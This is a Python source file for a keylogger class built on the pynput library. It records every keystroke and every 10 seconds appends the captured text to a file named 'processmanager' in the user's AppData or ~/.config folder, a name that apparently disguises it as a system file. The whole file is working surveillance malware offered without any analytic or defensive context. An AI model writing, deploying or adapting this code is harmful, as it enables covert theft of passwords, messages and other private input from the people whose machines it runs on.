#!/usr/bin/env python3
from os import environ, name
from threading import Timer

from pynput import keyboard


class KeyLogger:

    def __init__(self):
        self.log = ""
        self.log_path = self.get_log_path()

    @staticmethod
    def get_log_path():
        if name == "nt":
            return f'{environ["AppData"]}\\processmanager'
        return f'{environ["HOME"]}/.config/processmanager'

    def process_keys(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.right:
                self.log = self.log + ""
            elif key == key.left:
                self.log = self.log + ""
            elif key == key.up:
                self.log = self.log + ""
            elif key == key.down:
                self.log = self.log + ""
            else:
                self.log = self.log + f" {str(key)} "

    def report(self):
        with open(self.log_path, 'a') as key_log:
            key_log.write(self.log)
            self.log = ""
            key_log.close()
            timer = Timer(10, self.report)
            timer.start()

    def listen(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
